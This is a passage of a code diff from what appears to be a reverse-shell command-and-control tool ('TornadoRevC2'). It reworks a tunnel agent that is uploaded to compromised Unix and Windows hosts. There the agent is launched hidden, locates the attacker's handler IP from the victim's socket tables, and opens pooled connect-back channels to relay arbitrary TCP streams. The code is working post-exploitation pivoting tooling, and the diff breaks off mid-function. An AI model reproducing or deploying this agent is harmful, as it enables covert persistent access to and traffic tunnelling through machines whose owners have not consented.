@@ -2,19 +2,25 @@
 
 import base64
 import json
-import os
 import select
 import socket
 import struct
 import threading
 import time
 
-from .constants import TUNNEL_MARK_END, TUNNEL_MARK_START
-from .sysinfo import _b64_exec_cmd
+from .constants import TUNNEL_MARK_END, TUNNEL_MARK_START, TUNNEL_REGISTER_MAGIC
 
-# Embedded remote tunnel agent (Python 3). Listens on 127.0.0.1, multiplexes TCP streams.
+TUNNEL_POOL_SIZE = 3
+MAX_STREAM_BUF = 256 * 1024
+RELAY_CHUNK = 16384
+RELAY_IDLE_TIMEOUT = 3.0
+RELAY_ACTIVE_TIMEOUT = 20.0
+
 _REMOTE_AGENT_SOURCE = r'''
-import base64, json, select, socket, struct, sys, threading
+import base64, json, socket, struct, sys, threading, time
+
+CHANNELS = 3
+MAX_BUF = 262144
 
 def recv_msg(conn):
     hdr = b''
@@ -24,7 +30,7 @@ def recv_msg(conn):
             return None
         hdr += chunk
     length = struct.unpack('>I', hdr)[0]
-    if length > 16 * 1024 * 1024:
+    if length > 8 * 1024 * 1024:
         return None
     data = b''
     while len(data) < length:
@@ -38,179 +44,282 @@ def send_msg(conn, obj):
     payload = json.dumps(obj, separators=(',', ':')).encode('utf-8')
     conn.sendall(struct.pack('>I', len(payload)) + payload)
 
+def tune_sock(sock):
+    try:
+        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    except Exception:
+        pass
+
+def detect_handler_ip(revshell_port, fallback='127.0.0.1'):
+    try:
+        with open('/proc/net/tcp') as fh:
+            for line in fh.read().splitlines()[1:]:
+                parts = line.split()
+                if len(parts) < 4 or parts[3] != '01':
+                    continue
+                remote = parts[2]
+                if int(remote.split(':')[1], 16) != int(revshell_port):
+                    continue
+                hexip = remote.split(':')[0]
+                return '.'.join(str(int(hexip[i:i + 2], 16)) for i in (6, 4, 2, 0))
+    except Exception:
+        pass
+    try:
+        import subprocess
+        out = subprocess.check_output(
+            ['ss', '-H', '-tn', 'state', 'established', f'( dport = :{revshell_port} )'],
+            stderr=subprocess.DEVNULL, text=True,
+        )
+        for line in out.splitlines():
+            parts = line.split()
+            if len(parts) >= 4:
+                peer = parts[3]
+                if peer.startswith('['):
+                    return peer.split(']')[0][1:]
+                return peer.rsplit(':', 1)[0]
+    except Exception:
+        pass
+    if sys.platform == 'win32':
+        try:
+            import subprocess
+            out = subprocess.check_output(['netstat', '-n'], stderr=subprocess.DEVNULL, text=True, errors='ignore')
+            for line in out.splitlines():
+                if 'ESTABLISHED' in line and f':{revshell_port}' in line:
+                    for part in line.split():
+                        if part.count('.') == 3 and ':' in part:
+                            return part.rsplit(':', 1)[0]
+        except Exception:
+            pass
+    return fallback
+
+def gc_streams(streams, lock):
+    with lock:
+        dead = [sid for sid, e in streams.items() if e.get('closed')]
+        for sid in dead:
+            entry = streams.pop(sid, None)
+            if entry:
+                try:
+                    entry['sock'].close()
+                except Exception:
+                    pass
+
+def pump(entry):
+    sock = entry['sock']
+    buf_lock = entry['buf_lock']
+    sock.settimeout(1.0)
+    while not entry.get('closed'):
+        try:
+            piece = sock.recv(65536)
+            if not piece:
+                entry['closed'] = True
+                break
+            with buf_lock:
+                entry['buf'] += piece
+                if len(entry['buf']) > MAX_BUF:
+                    entry['buf'] = entry['buf'][-MAX_BUF:]
+        except socket.timeout:
+            continue
+        except Exception:
+            entry['closed'] = True
+            break
+
+def read_buf(entry, max_bytes):
+    with entry['buf_lock']:
+        if entry['buf']:
+            chunk = entry['buf'][:max_bytes]
+            entry['buf'] = entry['buf'][len(chunk):]
+            return chunk, entry['closed']
+        return b'', entry['closed']
+
+def close_stream(streams, lock, sid):
+    with lock:
+        entry = streams.pop(sid, None)
+    if entry:
+        entry['closed'] = True
+        try:
+            entry['sock'].close()
+        except Exception:
+            pass
+
+def serve(conn, streams, lock):
+    try:
+        while True:
+            msg = recv_msg(conn)
+            if not msg:
+                break
+            op = msg.get('op')
+            sid = msg.get('sid')
+            if op == 'ping':
+                send_msg(conn, {'ok': True, 'op': 'pong'})
+            elif op == 'connect':
+                host = msg.get('host', '127.0.0.1')
+                port = int(msg.get('port', 0))
+                close_stream(streams, lock, sid)
+                try:
+                    remote = socket.create_connection((host, port), timeout=10)
+                    tune_sock(remote)
+                    entry = {
+                        'sock': remote, 'buf': b'', 'buf_lock': threading.Lock(), 'closed': False,
+                    }
+                    with lock:
+                        streams[sid] = entry
+                    threading.Thread(target=pump, args=(entry,), daemon=True).start()
+                    send_msg(conn, {'ok': True, 'sid': sid})
+                except Exception as exc:
+                    send_msg(conn, {'ok': False, 'sid': sid, 'error': str(exc)})
+            elif op == 'send':
+                data = base64.b64decode(msg.get('data', '') or '')
+                with lock:
+                    entry = streams.get(sid)
+                if not entry or entry['closed']:
+                    send_msg(conn, {'ok': False, 'sid': sid, 'error': 'closed', 'closed': True})
+                    continue
+                try:
+                    entry['sock'].sendall(data)
+                    send_msg(conn, {'ok': True, 'sid': sid})
+                except Exception as exc:
+                    entry['closed'] = True
+                    send_msg(conn, {'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
+            elif op == 'recv':
+                max_bytes = int(msg.get('max', 65536))
+                with lock:
+                    entry = streams.get(sid)
+                if not entry:
+                    send_msg(conn, {'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
+                    continue
+                chunk, closed = read_buf(entry, max_bytes)
+                send_msg(conn, {
+                    'ok': True, 'sid': sid,
+                    'data': base64.b64encode(chunk).decode('ascii'),
+                    'closed': closed,
+                })
+            elif op == 'close':
+                close_stream(streams, lock, sid)
+                send_msg(conn, {'ok': True, 'sid': sid})
+            elif op == 'batch':
+                results = []
+                for item in msg.get('items', []):
+                    sub = dict(item)
+                    sub_op = sub.pop('op', '')
+                    sid = sub.get('sid')
+                    if sub_op == 'send':
+                        data = base64.b64decode(sub.get('data', '') or '')
+                        with lock:
+                            entry = streams.get(sid)
+                        if not entry or entry['closed']:
+                            results.append({'ok': False, 'sid': sid, 'error': 'closed', 'closed': True})
+                            continue
+                        try:
+                            entry['sock'].sendall(data)
+                            results.append({'ok': True, 'sid': sid})
+                        except Exception as exc:
+                            entry['closed'] = True
+                            results.append({'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
+                    elif sub_op == 'recv':
+                        max_bytes = int(sub.get('max', 65536))
+                        with lock:
+                            entry = streams.get(sid)
+                        if not entry:
+                            results.append({'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
+                            continue
+                        chunk, closed = read_buf(entry, max_bytes)
+                        results.append({
+                            'ok': True, 'sid': sid,
+                            'data': base64.b64encode(chunk).decode('ascii'),
+                            'closed': closed,
+                        })
+                send_msg(conn, {'ok': True, 'results': results})
+            elif op == 'gc':
+                gc_streams(streams, lock)
+                send_msg(conn, {'ok': True})
+            else:
+                send_msg(conn, {'ok': False, 'error': 'unknown op'})
+    finally:
+        gc_streams(streams, lock)
+
+def worker(streams, lock, handler_host, handler_port, token):
+    while True:
+        conn = None
+        try:
+            conn = socket.create_connection((handler_host, handler_port), timeout=20)
+            tune_sock(conn)
+            send_msg(conn, {'op': 'register', 'token': token, 'magic': 'TornadoRevC2'})
+            ack = recv_msg(conn)
+            if not ack or not ack.get('ok'):
+                conn.close()
+                time.sleep(2)
+                continue
+            serve(conn, streams, lock)
+        except Exception:
+            pass
+        finally:
+            if conn:
+                try:
+                    conn.close()
+                except Exception:
+                    pass
+        time.sleep(1)
+
 def main():
-    token = sys.argv[1] if len(sys.argv) > 1 else 'default'
-    import os
-    if os.name == 'nt':
-        base = os.environ.get('TEMP') or os.environ.get('TMP') or 'C:/Windows/Temp'
-    else:
-        base = '/tmp'
-    port_path = os.path.join(base, f'.tornado_tun_{token}.port')
-    sock_path = os.path.join(base, f'.tornado_tun_{token}.sock')
-    try:
-        if os.path.exists(sock_path):
-            os.unlink(sock_path)
-    except Exception:
-        pass
-    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind(('127.0.0.1', 0))
-    srv.listen(64)
-    port = srv.getsockname()[1]
-    try:
-        with open(port_path, 'w') as fh:
-            fh.write(str(port))
-    except Exception:
-        pass
+    if len(sys.argv) < 4:
+        return
+    handler_host = sys.argv[1]
+    handler_port = int(sys.argv[2])
+    token = sys.argv[3]
+    revshell_port = int(sys.argv[4]) if len(sys.argv) > 4 else max(handler_port - 1, 1)
+    if handler_host == 'auto':
+        handler_host = detect_handler_ip(revshell_port)
     streams = {}
     lock = threading.Lock()
-
-    def close_stream(sid):
-        with lock:
-            entry = streams.pop(sid, None)
-        if entry:
-            try:
-                entry['sock'].close()
-            except Exception:
-                pass
-
-    def handle_client(conn):
-        try:
-            while True:
-                msg = recv_msg(conn)
-                if not msg:
-                    break
-                op = msg.get('op')
-                sid = msg.get('sid')
-                if op == 'ping':
-                    send_msg(conn, {'ok': True, 'op': 'pong'})
-                elif op == 'connect':
-                    host = msg.get('host', '127.0.0.1')
-                    port = int(msg.get('port', 0))
-                    try:
-                        remote = socket.create_connection((host, port), timeout=15)
-                        remote.setblocking(False)
-                        with lock:
-                            streams[sid] = {'sock': remote, 'buf': b'', 'closed': False}
-                        send_msg(conn, {'ok': True, 'sid': sid})
-                    except Exception as exc:
-                        send_msg(conn, {'ok': False, 'sid': sid, 'error': str(exc)})
-                elif op == 'send':
-                    data = base64.b64decode(msg.get('data', '') or '')
-                    with lock:
-                        entry = streams.get(sid)
-                    if not entry or entry['closed']:
-                        send_msg(conn, {'ok': False, 'sid': sid, 'error': 'closed'})
-                        continue
-                    try:
-                        entry['sock'].sendall(data)
-                        send_msg(conn, {'ok': True, 'sid': sid})
-                    except Exception as exc:
-                        entry['closed'] = True
-                        send_msg(conn, {'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
-                elif op == 'recv':
-                    max_bytes = int(msg.get('max', 65536))
-                    with lock:
-                        entry = streams.get(sid)
-                    if not entry:
-                        send_msg(conn, {'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
-                        continue
-                    chunk = b''
-                    closed = entry['closed']
-                    if entry['buf']:
-                        chunk = entry['buf'][:max_bytes]
-                        entry['buf'] = entry['buf'][len(chunk):]
-                    else:
-                        try:
-                            r, _, _ = select.select([entry['sock']], [], [], 0)
-                            if r:
-                                piece = entry['sock'].recv(max_bytes)
-                                if not piece:
-                                    entry['closed'] = True
-                                    closed = True
-                                else:
-                                    chunk = piece
-                        except Exception:
-                            entry['closed'] = True
-                            closed = True
-                    send_msg(conn, {
-                        'ok': True, 'sid': sid,
-                        'data': base64.b64encode(chunk).decode('ascii'),
-                        'closed': closed,
-                    })
-                elif op == 'close':
-                    close_stream(sid)
-                    send_msg(conn, {'ok': True, 'sid': sid})
-                elif op == 'batch':
-                    results = []
-                    for item in msg.get('items', []):
-                        sub = dict(item)
-                        sub_op = sub.pop('op', '')
-                        if sub_op == 'send':
-                            sid = sub.get('sid')
-                            data = base64.b64decode(sub.get('data', '') or '')
-                            with lock:
-                                entry = streams.get(sid)
-                            if not entry or entry['closed']:
-                                results.append({'ok': False, 'sid': sid, 'error': 'closed', 'closed': True})
-                                continue
-                            try:
-                                entry['sock'].sendall(data)
-                                results.append({'ok': True, 'sid': sid})
-                            except Exception as exc:
-                                entry['closed'] = True
-                                results.append({'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
-                        elif sub_op == 'recv':
-                            sid = sub.get('sid')
-                            max_bytes = int(sub.get('max', 65536))
-                            with lock:
-                                entry = streams.get(sid)
-                            if not entry:
-                                results.append({'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
-                                continue
-                            chunk = b''
-                            closed = entry['closed']
-                            if entry['buf']:
-                                chunk = entry['buf'][:max_bytes]
-                                entry['buf'] = entry['buf'][len(chunk):]
-                            else:
-                                try:
-                                    r, _, _ = select.select([entry['sock']], [], [], 0)
-                                    if r:
-                                        piece = entry['sock'].recv(max_bytes)
-                                        if not piece:
-                                            entry['closed'] = True
-                                            closed = True
-                                        else:
-                                            chunk = piece
-                                except Exception:
-                                    entry['closed'] = True
-                                    closed = True
-                            results.append({
-                                'ok': True, 'sid': sid,
-                                'data': base64.b64encode(chunk).decode('ascii'),
-                                'closed': closed,
-                            })
-                    send_msg(conn, {'ok': True, 'results': results})
-                else:
-                    send_msg(conn, {'ok': False, 'error': 'unknown op'})
-        finally:
-            try:
-                conn.close()
-            except Exception:
-                pass
-
+    for _ in range(CHANNELS):
+        threading.Thread(
+            target=worker, args=(streams, lock, handler_host, handler_port, token), daemon=True,
+        ).start()
     while True:
-        try:
-            conn, _ = srv.accept()
-            conn.settimeout(300)
-            threading.Thread(target=handle_client, args=(conn,), daemon=True).start()
-        except Exception:
-            break
+        time.sleep(3600)
 
 if __name__ == '__main__':
     main()
 '''
+
+
+def _set_keepalive(sock):
+    try:
+        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+    except OSError:
+        pass
+
+
+def _recv_framed(conn, timeout=15.0):
+    conn.settimeout(timeout)
+    try:
+        hdr = b''
+        while len(hdr) < 4:
+            chunk = conn.recv(4 - len(hdr))
+            if not chunk:
+                return None
+            hdr += chunk
+        length = struct.unpack('>I', hdr)[0]
+        if length > 16 * 1024 * 1024:
+            return None
+        data = b''
+        while len(data) < length:
+            chunk = conn.recv(min(65536, length - len(data)))
+            if not chunk:
+                return None
+            data += chunk
+        return data
+    finally:
+        try:
+            conn.settimeout(None)
+        except OSError:
+            pass
+
+
+def _send_framed(conn, payload_bytes):
+    conn.sendall(struct.pack('>I', len(payload_bytes)) + payload_bytes)
 
 
 class TunnelManager:
@@ -220,21 +329,207 @@ class TunnelManager:
         self.h = handler
         self._lock = threading.Lock()
         self._counter = 0
-        self._proxies = {}    # proxy_id -> proxy dict
-        self._session_agents = {}  # client_sock -> agent info
-        self._session_locks = {}   # client_sock -> threading.Lock
+        self._proxies = {}
+        self._session_agents = {}
+        self._session_pools = {}       # client_sock -> [conn, ...]
+        self._conn_locks = {}          # id(conn) -> Lock
+        self._channel_rr = {}          # client_sock -> int
+        self._token_sessions = {}
+        self._channel_ready = {}
+        self._session_stream_counters = {}
+        self._deploy_locks = {}
+        self._tunnel_listener = None
+        self._tunnel_port = None
         self._last_error = ''
+        self._ensure_tunnel_listener()
+
+    def _ensure_tunnel_listener(self):
+        with self._lock:
+            if self._tunnel_listener:
+                return self._tunnel_port
+            base_port = int(self.h.revshell_port) + 1
+            last_exc = None
+            for port in range(base_port, base_port + 20):
+                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                try:
+                    listener.bind(('0.0.0.0', port))
+                    listener.listen(64)
+                except OSError as exc:
+                    last_exc = exc
+                    listener.close()
+                    continue
+                self._tunnel_listener = listener
+                self._tunnel_port = port
+                threading.Thread(target=self._tunnel_accept_loop, daemon=True).start()
+                return port
+            raise OSError(last_exc or 'could not bind tunnel listener')
+
+    def _tunnel_accept_loop(self):
+        while True:
+            try:
+                conn, _ = self._tunnel_listener.accept()
+                _set_keepalive(conn)
+                threading.Thread(target=self._register_tunnel, args=(conn,), daemon=True).start()
+            except OSError:
+                break
+
+    def _register_tunnel(self, conn):
+        try:
+            conn.settimeout(20.0)
+            raw = _recv_framed(conn, timeout=20.0)
+            if not raw:
+                conn.close()
+                return
+            msg = json.loads(raw.decode('utf-8'))
+            if msg.get('op') != 'register' or msg.get('magic') != TUNNEL_REGISTER_MAGIC:
+                conn.close()
+                return
+            token = msg.get('token')
+            session_sock = self._token_sessions.get(token)
+            if not session_sock:
+                conn.close()
+                return
+            with self._lock:
+                pool = self._session_pools.setdefault(session_sock, [])
+                pool[:] = [c for c in pool if self._conn_alive(c)]
+                if len(pool) >= TUNNEL_POOL_SIZE:
+                    conn.close()
+                    return
+                pool.append(conn)
+                self._conn_locks.setdefault(id(conn), threading.Lock())
+            _send_framed(conn, json.dumps({'ok': True}, separators=(',', ':')).encode('utf-8'))
+            ready = self._channel_ready.get(token)
+            if ready:
+                ready.set()
+            n = len(self._session_pools.get(session_sock, []))
+            self._log(session_sock, f"Tunnel channel registered ({n}/{TUNNEL_POOL_SIZE})")
+        except Exception:
+            try:
+                conn.close()
+            except OSError:
+                pass
+
+    def _alive_conns(self, client_sock):
+        pool = self._session_pools.get(client_sock, [])
+        alive = []
+        for c in pool:
+            try:
+                if c.fileno() != -1:
+                    alive.append(c)
+            except OSError:
+                pass
+        if len(alive) != len(pool):
+            self._session_pools[client_sock] = alive
+        return alive
+
+    def _has_channels(self, client_sock):
+        return bool(self._alive_conns(client_sock))
+
+    def _conn_lock(self, conn):
+        key = id(conn)
+        with self._lock:
+            if key not in self._conn_locks:
+                self._conn_locks[key] = threading.Lock()
+            return self._conn_locks[key]
+
+    def _pick_channel(self, client_sock):
+        alive = self._alive_conns(client_sock)
+        if not alive:
+            return None
+        with self._lock:
+            idx = self._channel_rr.get(client_sock, 0) % len(alive)
+            self._channel_rr[client_sock] = idx + 1
+        return alive[idx]
+
+    def _remove_conn(self, client_sock, conn):
+        with self._lock:
+            pool = self._session_pools.get(client_sock, [])
+            if conn in pool:
+                pool.remove(conn)
+            self._conn_locks.pop(id(conn), None)
+        try:
+            conn.close()
+        except OSError:
+            pass
+
+    def _drop_pool(self, client_sock):
+        for conn in self._alive_conns(client_sock):
+            self._remove_conn(client_sock, conn)
+        with self._lock:
+            self._session_pools.pop(client_sock, None)
+            self._channel_rr.pop(client_sock, None)
+
+    def _wait_for_channel(self, client_sock, token, timeout=30.0):
+        ready = self._channel_ready.get(token)
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            if self._has_channels(client_sock):
+                return True
+            if ready and ready.wait(timeout=min(0.2, max(deadline - time.time(), 0))):
+                if self._has_channels(client_sock):
+                    return True
+        return self._has_channels(client_sock)
+
+    def _request_on(self, conn, message, timeout=30.0):
+        """Send one framed request; return (response, hard_fail)."""
+        if not self._conn_alive(conn):
+            return None, True
+        lock = self._conn_lock(conn)
+        with lock:
+            try:
+                if not self._conn_alive(conn):
+                    return None, True
+                conn.settimeout(timeout)
+                _send_framed(conn, json.dumps(message, separators=(',', ':')).encode('utf-8'))
+                raw = _recv_framed(conn, timeout=timeout)
+                if not raw:
+                    return None, True
+                return json.loads(raw.decode('utf-8')), False
+            except socket.timeout:
+                return None, False
+            except (OSError, json.JSONDecodeError):
+                return None, True
+            finally:
+                try:
+                    conn.settimeout(None)
+                except OSError:
+                    pass
+
+    def _channel_request(self, client_sock, message, timeout=30.0, preferred=None):
+        tried = set()
+        candidates = []
+        if preferred is not None and self._conn_alive(preferred):
+            candidates.append(preferred)
+        for _ in range(TUNNEL_POOL_SIZE):
+            ch = self._pick_channel(client_sock)
+            if ch and id(ch) not in tried:
+                candidates.append(ch)
+                tried.add(id(ch))
+        for conn in candidates:
+            resp, hard_fail = self._request_on(conn, message, timeout=timeout)
+            if resp is not None:
+                return resp, conn
+            if hard_fail:
+                self._remove_conn(client_sock, conn)
+        return None, None
 
     def _next_id(self, prefix):
         with self._lock:
             self._counter += 1
             return f"{prefix}{self._counter}"
 
-    def _session_lock(self, client_sock):
+    def _next_stream_id(self, client_sock):
         with self._lock:
-            if client_sock not in self._session_locks:
-                self._session_locks[client_sock] = threading.Lock()
-            return self._session_locks[client_sock]
+            sid = self._session_stream_counters.get(client_sock, 0) + 1
+            self._session_stream_counters[client_sock] = sid
+            return sid
+
+    def _deploy_lock(self, client_sock):
+        with self._lock:
+            if client_sock not in self._deploy_locks:
+                self._deploy_locks[client_sock] = threading.Lock()
+            return self._deploy_locks[client_sock]
 
     def _log(self, client_sock, message):
         logger = self.h._get_session_logger(client_sock)
@@ -243,9 +538,7 @@ class TunnelManager:
 
     def _agent_token(self, client_sock):
         info = self.h._client_info(client_sock)
-        if not info:
-            return None
-        return f"s{info['id']}"
+        return f"s{info['id']}" if info else None
 
     def _set_error(self, message):
         self._last_error = message
@@ -257,31 +550,23 @@ class TunnelManager:
         )
 
     def _remote_paths(self, client_sock, shell_type, token):
-        staging_name = f".tornado_agent_{token}.py"
+        name = f".tornado_agent_{token}.py"
         if shell_type == 'windows':
-            agent_path = self.h.inmemory.resolve_staging_path(client_sock, shell_type, staging_name)
-        else:
-            agent_path = f"/tmp/.tornado_agent_{token}.py"
-        port_path = os.path.join(
-            os.path.dirname(agent_path.replace('/', os.sep)),
-            f".tornado_tun_{token}.port",
-        )
-        return agent_path, port_path
+            return self.h.inmemory.resolve_staging_path(client_sock, shell_type, name)
+        return f"/tmp/.tornado_agent_{token}.py"
 
     def _upload_agent(self, client_sock, agent_path, shell_type):
         data = _REMOTE_AGENT_SOURCE.encode('utf-8')
-        chunk_size = 8192
-        for offset in range(0, len(data), chunk_size):
-            chunk = data[offset:offset + chunk_size]
+        for offset in range(0, len(data), 8192):
             if not self.h._remote_write_chunk(
-                client_sock, agent_path, chunk, shell_type, truncate=(offset == 0),
+                client_sock, agent_path, data[offset:offset + 8192], shell_type, truncate=(offset == 0),
             ):
-                self._set_error('failed to upload tunnel agent to remote host')
+                self._set_error('failed to upload tunnel agent')
                 return False
         return True
 
     def _deploy_agent(self, client_sock):
-        if client_sock in self._session_agents and self._session_agents[client_sock].get('ready'):
+        if self._session_agents.get(client_sock, {}).get('ready') and self._has_channels(client_sock):
             return self._session_agents[client_sock]
 
         info = self.h._client_info(client_sock)
@@ -289,31 +574,35 @@ class TunnelManager:
             self._set_error('session not active')
             return None
 
+        self._ensure_tunnel_listener()
         shell_type = info.get('type', 'unix')
         token = self._agent_token(client_sock)
-        agent_path, port_path = self._remote_paths(client_sock, shell_type, token)
+        tunnel_port = self._tunnel_port
+        revshell_port = int(self.h.revshell_port)
+        agent_path = self._remote_paths(client_sock, shell_type, token)
         path_esc = self.h._escape_path(agent_path, shell_type)
-        port_esc = self.h._escape_path(port_path, shell_type)
         token_esc = token.replace("'", "'\\''")
+
+        self._token_sessions[token] = client_sock
+        ready = threading.Event()
+        self._channel_ready[token] = ready
+        ready.clear()
+        self._drop_pool(client_sock)
 
         if not self._upload_agent(client_sock, agent_path, shell_type):
             return None
 
         if shell_type == 'windows':
             deploy_ps = (
-                f"$p='{path_esc}';$portFile='{port_esc}';"
+                f"$p='{path_esc}';"
                 f"$py=(Get-Command python -ErrorAction SilentlyContinue).Source;"
                 f"if(-not $py){{$py=(Get-Command python3 -ErrorAction SilentlyContinue).Source}};"
                 f"if(-not $py){{'{TUNNEL_MARK_START}NO_PYTHON{TUNNEL_MARK_END}';return}};"
                 f"Get-CimInstance Win32_Process -Filter \"CommandLine LIKE '%.tornado_agent_{token}.py%'\" "
                 f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }};"
-                f"Start-Process -FilePath $py -ArgumentList @($p,'{token}') -WindowStyle Hidden | Out-Null;"
-                f"1..24 | ForEach-Object {{"
-                f"  if(Test-Path -LiteralPath $portFile){{"
-                f"    '{TUNNEL_MARK_START}'+(Get-Content -LiteralPath $portFile -Raw).Trim()+'{TUNNEL_MARK_END}';return"
-                f"  }}; Start-Sleep -Milliseconds 250"
-                f"}};"
-                f"'{TUNNEL_MARK_START}ERR{TUNNEL_MARK_END}'"
+                f"Start-Process -FilePath $py -ArgumentList @($p,'auto',{tunnel_port},'{token}',{revshell_port}) "
+                f"-WindowStyle Hidden | Out-Null;"
+                f"'{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
             )
             payload = self._tunnel_marked(client_sock, '', deploy_ps, 'windows', timeout=25.0)
         else:
@@ -321,222 +610,141 @@ class TunnelManager:
                 f"PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null); "
                 f"pkill -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
                 f"if [ -z \"$PY\" ]; then printf '%sNO_PYTHON%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'; exit 0; fi; "
-                f"nohup \"$PY\" '{path_esc}' '{token_esc}' >/dev/null 2>&1 & "
-                f"i=0; while [ $i -lt 24 ]; do "
-                f"if [ -f '{port_esc}' ]; then "
-                f"printf '%s' '{TUNNEL_MARK_START}'; cat '{port_esc}' 2>/dev/null | tr -d '\\n'; "
-                f"printf '%s' '{TUNNEL_MARK_END}'; exit 0; fi; "
-                f"sleep 0.25; i=$((i+1)); done; "
-                f"printf '%sERR%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'"
+                f"nohup \"$PY\" '{path_esc}' auto {tunnel_port} '{token_esc}' {revshell_port} >/dev/null 2>&1 & "
+                f"printf '%sOK%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'"
             )
             payload = self._tunnel_marked(client_sock, unix_cmd, '', shell_type, timeout=25.0)
 
         if payload == 'NO_PYTHON':
-            self._set_error('Python is not installed on the remote host (required for tunneling)')
+            self._set_error('Python not installed on remote host')
             return None
-        if not payload or payload == 'ERR':
-            self._set_error('tunnel agent failed to start on remote host (check Python and /tmp or /dev/shm)')
+        if payload != 'OK':
+            self._set_error('tunnel agent failed to start')
             return None
-        try:
-            port = int(payload)
-        except ValueError:
-            self._set_error(f'invalid tunnel agent port response: {payload!r}')
+        if not self._wait_for_channel(client_sock, token, timeout=30.0):
+            self._set_error(f'agent did not connect to handler port {tunnel_port}')
             return None
 
-        agent = {
-            'token': token,
-            'port': port,
-            'ready': True,
-            'remote_path': agent_path,
-            'port_path': port_path,
-        }
+        agent = {'token': token, 'ready': True, 'remote_path': agent_path}
         self._session_agents[client_sock] = agent
         self._last_error = ''
-        self._log(client_sock, f"Tunnel agent deployed on remote 127.0.0.1:{port}")
+        n = len(self._alive_conns(client_sock))
+        self._log(client_sock, f"Tunnel ready: {n} channel(s) on port {tunnel_port}")
+        self._start_keepalive(client_sock, agent)
         return agent
 
-    def _send_agent_message(self, client_sock, agent, message, timeout=15.0):
-        info = self.h._client_info(client_sock)
-        shell_type = info.get('type', 'unix') if info else 'unix'
-        port = agent['port']
-        msg_json = json.dumps(message, separators=(',', ':'))
-        msg_b64 = base64.b64encode(msg_json.encode('utf-8')).decode('ascii')
+    def _start_keepalive(self, client_sock, agent):
+        def loop():
+            gc_counter = 0
+            while (
+                client_sock in self.h.revshell_clients
+                and self._session_agents.get(client_sock) is agent
+            ):
+                time.sleep(30)
+                if not self._has_channels(client_sock):
+                    self._wait_for_channel(client_sock, agent['token'], timeout=10.0)
+                    continue
+                self._channel_request(client_sock, {'op': 'ping'}, timeout=10.0)
+                gc_counter += 1
+                if gc_counter >= 4:
+                    gc_counter = 0
+                    self._channel_request(client_sock, {'op': 'gc'}, timeout=10.0)
+        threading.Thread(target=loop, daemon=True).start()
 
-        if shell_type == 'windows':
-            ps = (
-                f"$port={port};"
-                f"$msg=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{msg_b64}'));"
-                f"$client=New-Object Net.Sockets.TcpClient('127.0.0.1',$port);"
-                f"$stream=$client.GetStream();"
-                f"$bytes=[Text.Encoding]::UTF8.GetBytes($msg);"
-                f"$len=[BitConverter]::GetBytes([uint32]$bytes.Length);"
-                f"if([BitConverter]::IsLittleEndian){{[Array]::Reverse($len)}};"
-                f"$stream.Write($len,0,4);$stream.Write($bytes,0,$bytes.Length);"
-                f"$hdr=New-Object byte[] 4;$stream.Read($hdr,0,4)|Out-Null;"
-                f"[Array]::Reverse($hdr);$rLen=[BitConverter]::ToUInt32($hdr,0);"
-                f"$resp=New-Object byte[] $rLen;$read=0;"
-                f"while($read -lt $rLen){{$n=$stream.Read($resp,$read,$rLen-$read);if($n-le 0){{break}};$read+=$n}};"
-                f"$stream.Close();$client.Close();"
-                f"'{TUNNEL_MARK_START}'+[Text.Encoding]::UTF8.GetString($resp)+'{TUNNEL_MARK_END}'"
-            )
-            payload = self._tunnel_marked(client_sock, '', ps, 'windows', timeout=timeout, strip_ws=False)
-        else:
-            client_source = (
-                "import base64,json,socket,struct\n"
-                f"msg=json.loads(base64.b64decode('{msg_b64}').decode())\n"
-                f"s=socket.create_connection(('127.0.0.1',{port}),timeout=10)\n"
-                "payload=json.dumps(msg,separators=(',',':')).encode()\n"
-                "s.sendall(struct.pack('>I',len(payload))+payload)\n"
-                "hdr=s.recv(4)\n"
-                "rl=struct.unpack('>I',hdr)[0] if len(hdr)==4 else 0\n"
-                "data=b''\n"
-                "while len(data)<rl:\n"
-                " chunk=s.recv(min(65536,rl-len(data)))\n"
-                " if not chunk: break\n"
-                " data+=chunk\n"
-                "s.close()\n"
-                f"print('{TUNNEL_MARK_START}'+data.decode()+ '{TUNNEL_MARK_END}', end='')"
-            )
-            unix_cmd = _b64_exec_cmd(client_source, (
-                ('python3', 'python'),
-                ('python', 'python'),
-            ))
-            payload = self._tunnel_marked(client_sock, unix_cmd, '', shell_type, timeout=timeout, strip_ws=False)
-
-        if not payload:
-            return None
-        try:
-            return json.loads(payload)
-        except json.JSONDecodeError:
-            self._set_error('tunnel agent returned invalid JSON')
-            return None
-
-    def _agent_request(self, client_sock, message, timeout=15.0):
-        agent = self._deploy_agent(client_sock)
+    def _agent_request(self, client_sock, message, timeout=30.0, preferred=None):
+        agent = self._session_agents.get(client_sock)
+        if not agent or not agent.get('ready'):
+            with self._deploy_lock(client_sock):
+                agent = self._session_agents.get(client_sock)
+                if not agent or not agent.get('ready'):
+                    agent = self._deploy_agent(client_sock)
         if not agent:
             return None
-        resp = self._send_agent_message(client_sock, agent, message, timeout=timeout)
-        if message.get('op') == 'ping' and (not resp or not resp.get('ok')):
-            self._session_agents.pop(client_sock, None)
-            agent = self._deploy_agent(client_sock)
